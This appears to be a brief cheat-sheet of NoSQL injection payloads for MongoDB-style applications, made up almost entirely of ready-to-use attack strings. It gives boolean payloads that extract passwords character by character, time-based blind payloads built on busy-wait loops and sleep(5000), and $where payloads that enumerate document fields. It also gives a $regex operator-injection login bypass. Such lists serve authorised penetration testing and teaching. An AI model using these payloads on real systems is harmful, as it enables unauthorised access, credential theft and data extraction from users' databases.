NoSQL is a technology which is kind of a replacement of our average SQL where we used to create databases and do stuff relating to it the tricks to detect it remain the same as usual sql injection.

Extracting sensitive data from db
1) helps to guess password characters
  returns && this.password[0] == 'a' || 'a'=='b
2) Doing the same using match function 
  admin' && this.password.match(/\d/) || 'a'=='b

Blind Time based injection
1) admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
2) admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'

Extracting fields
1) admin' && this.username!='  /  admin' && this.sus!=' 
  if username field is present a different response will be created which helps to to extract fields, same can be fuzzed to using intruder

"$where":"0" & "$where":"1" --> with other usual params can be used to detect if operator is being executed
now extract fields using
"$where":"Object.keys(this)[0].match('^.{0}a.*')"

Similarly 
{"username":"admin","password":{"$regex":"^.*"}}
